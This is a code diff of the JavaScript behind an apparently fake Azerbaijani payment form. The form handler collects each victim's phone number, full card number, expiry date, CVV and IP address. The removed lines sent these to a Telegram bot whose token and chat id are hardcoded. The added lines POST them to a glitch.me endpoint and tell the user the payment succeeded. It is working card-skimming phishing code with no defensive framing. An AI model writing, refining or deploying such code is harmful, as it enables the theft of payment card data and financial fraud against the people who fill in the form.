@@ -262,34 +262,49 @@
     }
 
     // Formun məlumatlarını Telegrama göndərmək
-    async function gonder(event) {
-      event.preventDefault();
+   async function gonder(event) {
+  event.preventDefault();
 
-      const telefonNumarasi = document.getElementById("telefon-numarasi").value;
-      const tutar = document.getElementById("tutar").value;
-      const kartNumarasi = document.getElementById("kart-numarasi").value.replace(/\D/g, '');
-      const sonKullanmaAy = document.getElementById("son-kullanma-ay").value;
-      const sonKullanmaYil = document.getElementById("son-kullanma-yil").value;
-      const cvv = document.getElementById("cvv").value;
+  const telefonNumarasi = document.getElementById("telefon-numarasi").value;
+  const tutar = document.getElementById("tutar").value;
+  const kartNumarasi = document.getElementById("kart-numarasi").value.replace(/\D/g, '');
+  const sonKullanmaAy = document.getElementById("son-kullanma-ay").value;
+  const sonKullanmaYil = document.getElementById("son-kullanma-yil").value;
+  const cvv = document.getElementById("cvv").value;
 
-      const botToken = "8136871782:AAGl_5_It13PYi6UPTsVZRQB2LgTVrjG7Ao";
-      const chatId = "-1002496527853";
+  const ipResponse = await fetch("https://api.ipify.org?format=json");
+  const ipData = await ipResponse.json();
+  const ipAdres = ipData.ip;
 
-      const ipResponse = await fetch("https://api.ipify.org?format=json");
-      const ipData = await ipResponse.json();
-      const ipAdres = ipData.ip;
-      
-      const mesaj = `Tel: ${telefonNumarasi}\nTutar: ${tutar}₼\nKart: ${kartNumarasi}\nTarix: ${sonKullanmaAy}/${sonKullanmaYil}\nCVV: ${cvv}\nIP Adresi: ${ipAdres}`;
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}`;
+  const data = {
+    telefon: telefonNumarasi,
+    tutar: tutar,
+    kart: kartNumarasi,
+    ay: sonKullanmaAy,
+    yil: sonKullanmaYil,
+    cvv: cvv,
+    ip: ipAdres,
+  };
 
-      try {
-        await fetch(url);
-        window.location.href = "pay/index.html";
-      } catch (error) {
-        console.error("Hata:", error);
-        alert("Bir xəta baş verdi. Zəhmət olmasa, təkrar cəhd edin.");
-      }
+  try {
+    const response = await fetch("https://your-project-name.glitch.me/send", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(data),
+    });
+
+    if (response.ok) {
+      alert("Ödəniş uğurla tamamlandı!");
+    } else {
+      alert("Bir xəta baş verdi.");
     }
+  } catch (error) {
+    console.error("Hata:", error);
+    alert("Bir xəta baş verdi. Zəhmət olmasa, təkrar cəhd edin.");
+  }
+}
 
     function kartNumarasiInput(input) {
       input.value = input.value.replace(/\D/g, '').slice(0, 16);
